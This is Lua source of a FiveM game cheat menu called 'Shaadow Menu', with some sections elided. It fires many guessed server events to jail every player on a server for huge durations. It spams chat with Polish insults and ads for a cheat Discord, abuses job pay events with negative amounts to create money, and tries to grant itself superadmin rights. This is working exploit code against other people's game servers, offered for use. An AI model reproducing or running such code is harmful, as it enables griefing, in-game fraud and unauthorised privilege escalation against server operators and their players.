    ...
    local function MagnetoBoy()
      ...
      local function jailall()
        local pbase = GetActivePlayers()
          for i=0, 256 do
				...
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES")
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("esx_jailer:*", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("esx_jailer:eloelo90", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("esx_jailer:wwiezienie", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("searp:sendToJail", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES")
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(i), 5023432432434200, "POZDRO JEBAC WAS", -32432432423432432)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
				...
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES", -32432432423432432)
				TSE("esx_jailer:fabianfudalijebanyprzyglup", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES | 'a :D", -32432432423432432)
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "YO MANY HTTPS://DC.XARIES|  :D", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 9999999999)
				TSE("esx-jail:jailPlayer",   GetPlayerServerId(i), 3000)
				TSE("esx_jailer:jailhype", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "YO MANY HTTPS://DC.XARIES :D?", 9333397)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "YO MANY HTTPS://DC.XARIES :D?", 9333397)
				TSE("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 9999999999)
				TSE("esx_policejob:message", GetPlayerServerId(i), "YO MANY HTTPS://DC.XARIES :D")
				TSE("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TSE("8321hiue89js", GetPlayerServerId(i), 5007, "YO MANY HTTPS://DC.XARIES :D", 323434532532, securityToken)
				TSE("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "YO MANY HTTPS://DC.XARIES :D", 500324532)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES :D")
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "YO MANY HTTPS://DC.XARIES :D")
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES:D")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."YO MANY HTTPS://DC.XARIES :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES", 300)
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "hYO MANY HTTPS://DC.XARIES | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "YO MANY HTTPS://DC.XARIES | Darmowe cheaty na Fivem'a :D")
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." YO MANY HTTPS://DC.XARIES | Darmowe cheaty na Fivem'a :D")
				TSE('esx_policejob:zakujtypeczka',  GetPlayerServerId(i))
				TSE('esx_ruski_areszt:startAreszt', GetPlayerServerId(i))
				TSE("arisonarp:wiezienie", GetPlayerServerId(i), 9999999999 * 60, "YO MANY HTTPS://DC.XARIES | Darmowe cheaty na Fivem'a :D", 1337)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 999999 * 60, "YO MANY HTTPS://DC.XARIES | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "YO MANY HTTPS://DC.XARIES | Darmowe cheaty na Fivem'a :D")
				...
				TSE("esxjailer:sendToJail2", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 9995345349999999)
				TSE("esx_jaler:sendToWiezz", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "YO MANY HTTPS://DC.XARIES :D", 9995345349999999)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937 * 60, "YO MANY HTTPS://DC.XARIES :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D")
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES:D")
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D")
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("esx_jailer:jail", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("luki_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 99999 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "YO MANY HTTPS://DC.XARIES :D")
				TSE("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 1,2137)
				TSE("esxjailer:sendToJail2", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES", 99953)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "YO MANY HTTPS://DC.XARIES :D", 99953)
				TSE("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "YO MANY HTTPS://DC.XARIES", 9999)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(i), 100 * 60, "YO MANY HTTPS://DC.XARIES", 999)
				TSE("esx-qalle-jail:wyslijwiezienie", GetPlayerServerId(i), 60*1, "YO MANY HTTPS://DC.XARIES", 111)
      ...
      local function bananapartyall()
        ...
        for c = 0, 9 do
          ...
          TSE("_chat:messageEntered", "Shaadow Menu ^110", { 141, 211, 255 }, "^"..c.."Skrrrra!")
        end
        local pbase = GetActivePlayers()
        for i=0, #pbase do
	...
	TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
          ...
          function esxdestroyv3()
            ...
            for c = 0, 9 do
              ...
              TSE("_chat:messageEntered", "Twoja stara to jest cipa ^110", { 141, 211, 255 }, "^"..c.."mam ja na jednego hita")
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do
          ...
          function nukeserver()
            ...
            for i=0,128 do
              for c = 0, 9 do
                TSE("_chat:messageEntered", "Shaadow Menu ^110", { 141, 211, 255 }, "^"..c.."Skrrrrra!")
              end
        ...
        Citizen.CreateThread(function()
		  ...
		  LR.CreateSubMenu(TrollP, crds, bytexd)
          ...
          while Enabled do
            ...
            if LR.IsMenuOpened(LynxIcS) then
              ...
              DrawTxt("Shaadow Menu ~r~10 ~s~- "..pisello, 0.80, 0.9)
              drawDescription("Jestes gangsterem: ~r~"..pisello.." ~s~!", 0.5, 0.5)
              notify("Shaadow Menu - ~g~10", true)
              notify("~u~ShaadowMenu~u~/", false)
              if LR.MenuButton("~p~#~s~ Twoje Opcje", sMX) then
              elseif LR.MenuButton("~p~#~s~ Online Players", OPMS) then
			  elseif LR.MenuButton("~p~#~s~ ~w~ShaadowOpcje", TrollP) then
              ...
              elseif LR.MenuButton("~p~# ~y~Shaadow", crds) then
			  elseif LR.Button("Wylacz Menu (~r~PANIC BUTTON)") then
			  Enabled = false
              end
        ...
        LR.OpenMenu(LynxIcS)
            ...
            elseif LR.IsMenuOpened(esms) then
               if LR.Button("~o~Pieniazki ~r~ WARNING!") then
				...
				TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), '~r~Shaadow | MONEY MENU  <3')
				TriggerServerEvent("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~Shaadow | MONEY MENU <3')
              elseif LR.Button("~g~ESX ~y~PieniazkiV2") then
                TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), '~r~Shaadow| MONEY MENU  <3')
				TriggerServerEvent("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~Shaadow | MONEY MENU <3')
				TriggerServerEvent("tostzdrapka:wygranko", securityToken)
              elseif LR.CheckBox("~g~pieniazkiV3~y~ reward", huntspam, function(enabled) huntspam = enabled end) then
			  TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), '~r~JEBAC SKAZE | MONEY MENU  <3')
				TriggerServerEvent("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~JEBACSKAZE | MONEY MENU <3')
				TriggerServerEvent("tostzdrapka:wygranko", securityToken)
              elseif LR.Button("~g~ESX ~y~Pieniazki Najnowsze") then
                TriggerServerEvent("esx_garbage:pay", -3000009)
				TriggerServerEvent("esx_dirtyjob:pay", -300000)
				TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), '~r~Kochac ariesa | MONEY MENU Shaadow <3')
				TriggerServerEvent("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~Aries <3 | MONEY MENU <3')
              elseif LR.Button("~g~ESX ~y~KolorKaska") then
			  TriggerServerEvent('esx_dmvschool:pay', -3000000)
        ...
        elseif LR.Button("~r~Rampinator LOL") then
          for vehicle in EnumerateVehicles() do
            ...
            SetEntityAsMissionEntity(ramp, true, true)
              ...
              drawDescription("Shaadow", 0.46, 0.46)
              if LR.Button("~r~Dzwiek ~s~Kajdanek") then
			  ...
			  elseif LR.Button("~g~Dzwiek ~r~Pasow ~r~") then
			   TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 13232, 'pasysound', 1.0)
			  elseif LR.Button("~g~Dzwiek ~r~Alarm ~r~") then
			   TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 5, "alarm", 0.5)
			  elseif LR.Button("~g~Dzwiek ~r~Zakuwanie ~r~") then
			   TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 5, "cuff", 0.5)
			  elseif LR.Button("~g~Dzwiek ~r~Zamykanie drzwi ~r~") then
			   TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 103232, "lock", 1.0)
			  elseif LR.Button("~g~Dzwiek ~r~Szajbus ~r~") then
			   TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10, "szajbusek", 1)
			   
                end
				
				LR.Display()
              elseif LR.IsMenuOpened(TrollP) then
			    if LR.Button("~p~#~s~Shaadow~r~#~r~0113"," ~p~DEV") then
			  elseif LR.Button("~g~Dodaj ~r~Admina ~r~V1 ") then
			   TriggerEvent("es:addGroup", "superadmin", cameltoe )
			   TriggerClientEvent('es_admin:setGroup', cameltoe, "superadmin")
			   TriggerEvent("es:setPlayerData", cameltoe, "group", "superadmina")
